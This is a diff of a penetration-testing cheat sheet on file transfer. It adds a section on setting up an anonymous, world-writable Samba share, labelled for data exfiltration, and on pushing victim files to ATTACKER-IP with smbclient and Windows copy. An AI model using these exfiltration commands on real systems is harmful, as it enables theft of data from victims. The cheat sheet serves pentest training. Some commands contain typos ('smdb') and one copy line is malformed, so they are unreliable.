@@ -6,7 +6,7 @@
 * Pure FTPd
 * aTFTPd
 
-## Run and download from a Python3 Web Server
+## Use Python3 Web Server
 
 * serve current working directory
 * retrieve data with different clients
@@ -17,7 +17,7 @@ wget http://serverip:8080/filename -O output
 curl http://serverip:8080/filename -o output
 ```
 
-## Install and configure Apache Web server
+## Use Apache Web server
 
 * Apache2 is insalled on kali
 * config file /etc/apache2/apache2.conf
@@ -120,6 +120,60 @@ It's possible without B64 encoding, if the boundary is not part of file.
 
 --FILEUPLOAD--
 EOF
+```
+
+## Use SMB anonymous share
+
+Scenario
+
+* Use an anonymous share for data exfiltration from Windows or Linux
+* Install `apt install samba` and configure anoymous `share` folder
+* Run samba deamon `systemctl start smdb` and verify with upload
+
+Attacker
+
+```bash
+# Install and configure share folder
+sudo apt install samba
+sudo cat /etc/samba/smb.conf
+
+[share]
+   path = /var/lib/samba/share
+   comment = Data Exfiltration
+   browsable = yes
+   writable = yes
+   guest ok = yes
+;   guest only = yes
+   force user = nobody
+   create mask = 0666
+   directory mask = 0755
+
+# Create world writeable folder
+sudo mkdir -p /var/lib/samba/share
+sudo chmod -R 0777 /var/lib/samba/share
+sudo chown -R nobody:nogroup /var/lib/samba/share
+
+# Add user to samba share
+sudo smbpasswd -a kali
+
+# Run samba deamon
+sudo systemctl start smdb
+enum4linux -S ATTACKER-IP | grep -P "/share|Data Exfiltration"
+
+share           Disk      Data Exfiltration
+//ATTACKER-IP/share  Mapping: OK Listing: OK Writing: N/A
+```
+
+Victim
+
+```bash
+# Anonymous file upload and download (linux)
+smbclient //ATTACKER-IP/share -U "" -N -c 'put smbtest.txt'
+smbclient //ATTACKER-IP/share -U "" -N -c 'get smbtest.txt'
+
+# Anonymous file upload and download (windows)
+copy .\path\to\file \\REMOTE-IP\share\upload
+copy \\REMOTE-IP\share\download copy .\path\to\file
 ```
 
 ## Install and configure Pure FTP
